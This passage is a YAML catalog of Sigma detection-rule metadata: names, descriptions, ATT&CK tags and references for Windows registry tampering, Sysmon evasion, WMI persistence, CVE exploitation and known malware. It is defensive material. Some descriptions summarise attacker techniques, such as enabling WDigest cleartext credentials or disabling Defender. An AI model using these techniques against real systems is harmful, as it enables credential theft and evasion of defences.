  notes: ''
- detection_id: fc014922-5def-4da9-a0fc-28c973f41bfb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_wab_dllpath_reg_change.yml
  name: Execution DLL of Choice Using WAB.EXE
  description: This rule detects that the path to the DLL written in the registry
    is different from the default one. Launched WAB.exe tries to load the DLL from
    Registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OSBinaries/Wab.yml
  - https://twitter.com/Hexacorn/status/991447379864932352
  - http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d6a9b252-c666-4de6-8806-5561bbbd3bdc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_wdigest_enable_uselogoncredential.yml
  name: Wdigest Enable UseLogonCredential
  description: Detects potential malicious modification of the property value of UseLogonCredential
    from HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to enable
    clear-text credentials
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190510-RegModWDigestDowngrade/notebook.html
  - https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649
  - https://github.com/redcanaryco/atomic-red-team/blob/73fcfa1d4863f6a4e17f90e54401de6e30a312bb/atomics/T1112/T1112.md#atomic-test-3---modify-registry-to-store-logon-credentials
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0eb46774-f1ab-4a74-8238-1155855f2263
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_windows_defender_tamper.yml
  name: Disable Windows Defender Functionalities Via Registry Keys
  description: Detects when attackers or tools disable Windows Defender functionalities
    via the Windows registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105
  - https://admx.help/?Category=Windows_7_2008R2&Policy=Microsoft.Policies.WindowsDefender::SpyNetReporting
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker
  - https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html
  - https://www.tenforums.com/tutorials/105533-enable-disable-windows-defender-exploit-protection-settings.html
  - https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-antivirus.html
  - https://securelist.com/key-group-ransomware-samples-and-telegram-schemes/114025/
  false_positives:
  - Administrator actions via the Windows Defender interface
  - Third party Antivirus
  notes: ''
- detection_id: 6db5eaf9-88f7-4ed9-af7d-9ef2ad12f236
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_winget_admin_settings_tampering.yml
  name: Winget Admin Settings Modification
  description: Detects changes to the AppInstaller (winget) admin settings. Such as
    enabling local manifest installations or disabling installer hash checks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  - https://github.com/microsoft/winget-cli/blob/02d2f93807c9851d73eaacb4d8811a76b64b7b01/src/AppInstallerCommonCore/Public/winget/AdminSettings.h#L13
  false_positives:
  - The event doesn't contain information about the type of change. False positives
    are expected with legitimate changes
  notes: ''
- detection_id: fa277e82-9b78-42dd-b05c-05555c7b6015
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_winget_enable_local_manifest.yml
  name: Enable Local Manifest Installation With Winget
  description: Detects changes to the AppInstaller (winget) policy. Specifically the
    activation of the local manifest installation, which allows a user to install
    new packages via custom manifests.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - Administrators or developers might enable this for testing purposes or to install
    custom private packages
  notes: ''
- detection_id: f7997770-92c3-4ec9-b112-774c4ef96f96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_winlogon_allow_multiple_tssessions.yml
  name: Winlogon AllowMultipleTSSessions Enable
  description: 'Detects when the ''AllowMultipleTSSessions'' value is enabled.

    Which allows for multiple Remote Desktop connection sessions to be opened at once.

    This is often used by attacker as a way to connect to an RDP session without disconnecting
    the other users

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  false_positives:
  - Legitimate use of the multi session functionality
  notes: ''
- detection_id: bbf59793-6efb-4fa1-95ca-a7d288e52c88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_winlogon_notify_key.yml
  name: Winlogon Notify Key Logon Persistence
  description: 'Adversaries may abuse features of Winlogon to execute DLLs and/or
    executables when a user logs in.

    Winlogon.exe is a Windows component responsible for actions at logon/logoff as
    well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.004/T1547.004.md#atomic-test-3---winlogon-notify-key-logon-persistence---powershell
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8ac03a65-6c84-4116-acad-dc1558ff7a77
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_config_modification.yml
  name: Sysmon Configuration Change
  description: Detects a Sysmon configuration change, which could be the result of
    a legitimate reconfiguration or someone trying manipulate the configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: sysmon
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  false_positives:
  - Legitimate administrative action
  notes: ''
- detection_id: 815cd91b-7dbc-4247-841a-d7dd1392b0a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_config_modification_error.yml
  name: Sysmon Configuration Error
  description: Detects when an adversary is trying to hide it's action from Sysmon
    logging based on error messages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: sysmon_error
  data_sources: []
  tactics: []
  techniques:
  - T1564
  tags:
  - attack.defense-evasion
  - attack.t1564
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html
  false_positives:
  - Legitimate administrative action
  notes: ''
- detection_id: 1f2b5353-573f-4880-8e33-7d04dcf97744
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_config_modification_status.yml
  name: Sysmon Configuration Modification
  description: Detects when an attacker tries to hide from Sysmon by disabling or
    stopping it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: sysmon_status
  data_sources: []
  tactics: []
  techniques:
  - T1564
  tags:
  - attack.defense-evasion
  - attack.t1564
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://talesfrominfosec.blogspot.com/2017/12/killing-sysmon-silently.html
  false_positives:
  - Legitimate administrative action
  notes: ''
- detection_id: 23b71bc5-953e-4971-be4c-c896cda73fc2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_file_block_executable.yml
  name: Sysmon Blocked Executable
  description: Triggers on any Sysmon "FileBlockExecutable" event, which indicates
    a violation of the configured block policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: sysmon
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://medium.com/@olafhartong/sysmon-14-0-fileblockexecutable-13d7ba3dff3e
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c3e5c1b1-45e9-4632-b242-27939c170239
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_file_block_shredding.yml
  name: Sysmon Blocked File Shredding
  description: Triggers on any Sysmon "FileBlockShredding" event, which indicates
    a violation of the configured shredding policy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: sysmon
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 693a44e9-7f26-4cb6-b787-214867672d3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/sysmon/sysmon_file_executable_detected.yml
  name: Sysmon File Executable Creation Detected
  description: Triggers on any Sysmon "FileExecutableDetected" event, which triggers
    every time a PE that is monitored by the config is created.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: sysmon
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  - https://medium.com/@olafhartong/sysmon-15-0-file-executable-detected-40fd64349f36
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0f06a3a5-6a09-413f-8743-e6cf35561297
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml
  name: WMI Event Subscription
  description: Detects creation of WMI event subscription persistence method
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: wmi_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-19-wmievent-wmieventfilter-activity-detected
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-20-wmievent-wmieventconsumer-activity-detected
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-21-wmievent-wmieventconsumertofilter-activity-detected
  false_positives:
  - Exclude legitimate (vetted) use of WMI event subscription in your network
  notes: ''
- detection_id: 83844185-1c5b-45bc-bcf3-b5bf3084ca5b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/wmi_event/sysmon_wmi_susp_encoded_scripts.yml
  name: Suspicious Encoded Scripts in a WMI Consumer
  description: Detects suspicious encoded payloads in WMI Event Consumers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: wmi_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1047
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.t1047
  - attack.persistence
  - attack.t1546.003
  time_window: ''
  references:
  - https://github.com/RiccardoAncarani/LiquidSnake
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe21810c-2a8c-478f-8dd3-5a287fb2a0e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/wmi_event/sysmon_wmi_susp_scripting.yml
  name: Suspicious Scripting in a WMI Consumer
  description: Detects suspicious commands that are related to scripting/powershell
    in WMI Event Consumers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: wmi_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  tags:
  - attack.execution
  - attack.t1059.005
  time_window: ''
  references:
  - https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/
  - https://github.com/Neo23x0/signature-base/blob/615bf1f6bac3c1bdc417025c40c073e6c2771a76/yara/gen_susp_lnk_files.yar#L19
  - https://github.com/RiccardoAncarani/LiquidSnake
  false_positives:
  - Legitimate administrative scripts
  notes: ''
- detection_id: 7e4bfe58-4a47-4709-828d-d86c78b7cc1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-compliance/other/netflow_cleartext_protocols.yml
  name: Cleartext Protocol Usage Via Netflow
  description: 'Ensure that all account usernames and authentication credentials are
    transmitted across networks using encrypted channels

    Ensure that an encryption is used for all sensitive information in transit.

    Ensure that an encrypted channels is used for all administrative account access.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: stable
  platform: ''
  product: netflow
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a395cbc-a84a-463a-9086-ed8a70e573c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-compliance/product/qualys/qualys_default_credentials_usage.yml
  name: Default Credentials Usage
  description: 'Before deploying any new asset, change all default passwords to have
    values consistent with administrative level accounts.

    Sigma detects default credentials usage. Sigma for Qualys vulnerability scanner.
    Scan type - Vulnerability Management.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: experimental
  platform: qualys
  product: qualys
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  - https://community.qualys.com/docs/DOC-6406-reporting-toolbox-focused-search-lists
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6b2066c8-3dc7-4db7-9db0-6cc1d7b0dde9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-compliance/product/qualys/qualys_host_without_firewall.yml
  name: Host Without Firewall
  description: Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability
    scanner. Scan type - Vulnerability Management.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: experimental
  platform: qualys
  product: qualys
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags: []
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  false_positives: []
  notes: ''
- detection_id: a4a899e8-fd7a-49dd-b5a8-7044def72d61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2010/Exploits/CVE-2010-5278/web_cve_2010_5278_exploitation_attempt.yml
  name: CVE-2010-5278 Exploitation Attempt
  description: 'MODx manager - Local File Inclusion:Directory traversal vulnerability
    in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and
    possibly earlier,

    when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files
    via a .. (dot dot) in the class_key parameter.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2010-5278
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/projectdiscovery/nuclei-templates
  false_positives:
  - Scanning from Nuclei
  - Unknown
  notes: ''
- detection_id: a133193c-2daa-4a29-8022-018695fcf0ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2014/Exploits/CVE-2014-6287/web_cve_2014_6287_hfs_rce.yml
  name: Rejetto HTTP File Server RCE
  description: Detects attempts to exploit a Rejetto HTTP File Server (HFS) via CVE-2014-6287
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1190
  - attack.t1505.003
  - cve.2014-6287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://vk9-sec.com/hfs-code-execution-cve-2014-6287/
  - https://www.exploit-db.com/exploits/39161
  - https://github.com/Twigonometry/Cybersecurity-Notes/blob/c875b0f52df7d2c7a870e75e1f0c2679d417931d/Writeups/Hack%20the%20Box/Boxes/Optimum/10%20-%20Website.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0b70adb-0075-43b0-9745-e82a1c608fcc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2014/TA/Axiom/proc_creation_win_apt_zxshell.yml
  name: ZxShell Malware
  description: Detects a ZxShell start by the called and well-known function name
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1218.011
  tags:
  - attack.execution
  - attack.t1059.003
  - attack.defense-evasion
  - attack.t1218.011
  - attack.s0412
  - attack.g0001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100
  - https://pub-7cb8ac806c1b4c4383e585c474a24719.r2.dev/116309e7121bc8b0e66e4166c06f7b818e1d3629.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c601f20d-570a-4cde-a7d6-e17f99cb8e7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2014/TA/Turla/proc_creation_win_apt_turla_commands_critical.yml
  name: Turla Group Lateral Movement
  description: Detects automated lateral movement by Turla group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1021.002
  - T1059
  - T1083
  - T1135
  tags:
  - attack.g0010
  - attack.execution
  - attack.t1059
  - attack.lateral-movement
  - attack.t1021.002
  - attack.discovery
  - attack.t1083
  - attack.t1135
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/the-epic-turla-operation/65545/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e2e51c5-c699-4794-ba5a-29f5da40ac0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2014/TA/Turla/proc_creation_win_apt_turla_comrat_may20.yml
  name: Turla Group Commands May 2020
  description: Detects commands used by Turla group as reported by ESET in May 2020
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1027
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.g0010
  - attack.execution
  - attack.t1059.001
  - attack.t1053.005
  - attack.t1027
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7993792c-5ce2-4475-a3db-a3a5539827ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2015/Exploits/CVE-2015-1641/proc_creation_win_exploit_cve_2015_1641.yml
  name: Exploit for CVE-2015-1641
  description: Detects Winword starting uncommon sub process MicroScMgmt.exe as used
    in exploits for CVE-2015-1641
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  - cve.2015-1641
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/en/file/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8/analysis/
  - https://www.hybrid-analysis.com/sample/5567408950b744c4e846ba8ae726883cb15268a539f3bb21758a466e47021ae8?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: 864403a1-36c9-40a2-a982-4c9a45f7d833
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Exploits/CVE-2017-0261/proc_creation_win_exploit_cve_2017_0261.yml
  name: Exploit for CVE-2017-0261
  description: Detects Winword starting uncommon sub process FLTLDR.exe as used in
    exploits for CVE-2017-0261 and CVE-2017-0262
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1204.002
  - T1566.001
  tags:
  - attack.execution
  - attack.t1203
  - attack.t1204.002
  - attack.initial-access
  - attack.t1566.001
  - cve.2017-0261
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html
  false_positives:
  - Several false positives identified, check for suspicious file names or locations
    (e.g. Temp folders)
  notes: ''
- detection_id: 678eb5f4-8597-4be6-8be7-905e4234b53a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Exploits/CVE-2017-11882/proc_creation_win_exploit_cve_2017_11882.yml
  name: Droppers Exploiting CVE-2017-11882
  description: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and
    other sub processes like mshta.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1204.002
  - T1566.001
  tags:
  - attack.execution
  - attack.t1203
  - attack.t1204.002
  - attack.initial-access
  - attack.t1566.001
  - cve.2017-11882
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100
  - https://www.linkedin.com/pulse/exploit-available-dangerous-ms-office-rce-vuln-called-thebenygreen-
  - https://github.com/embedi/CVE-2017-11882
  false_positives:
  - Unknown
  notes: ''
- detection_id: fdd84c68-a1f6-47c9-9477-920584f94905
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Exploits/CVE-2017-8759/proc_creation_win_exploit_cve_2017_8759.yml
  name: Exploit for CVE-2017-8759
  description: Detects Winword starting uncommon sub process csc.exe as used in exploits
    for CVE-2017-8759
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1204.002
  - T1566.001
  tags:
  - attack.execution
  - attack.t1203
  - attack.t1204.002
  - attack.initial-access
  - attack.t1566.001
  - cve.2017-8759
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100
  - https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1fac1481-2dbc-48b2-9096-753c49b4ec71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/Adwind-RAT/proc_creation_win_malware_adwind.yml
  name: Adwind RAT / JRAT
  description: Detects javaw.exe in AppData folder as used by Adwind / JRAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100
  - https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf
  false_positives: []
  notes: ''
- detection_id: cb062102-587e-4414-8efa-dbe3c7bf19c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/CosmicDuke/win_security_mal_cosmik_duke_persistence.yml
  name: CosmicDuke Service Installation
  description: 'Detects the installation of a service named "javamtsup" on the system.

    The CosmicDuke info stealer uses Windows services typically named "javamtsup"
    for persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.003
  - T1569.002
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1543.003
  - attack.t1569.002
  - detection.emerging-threats
  time_window: ''
  references:
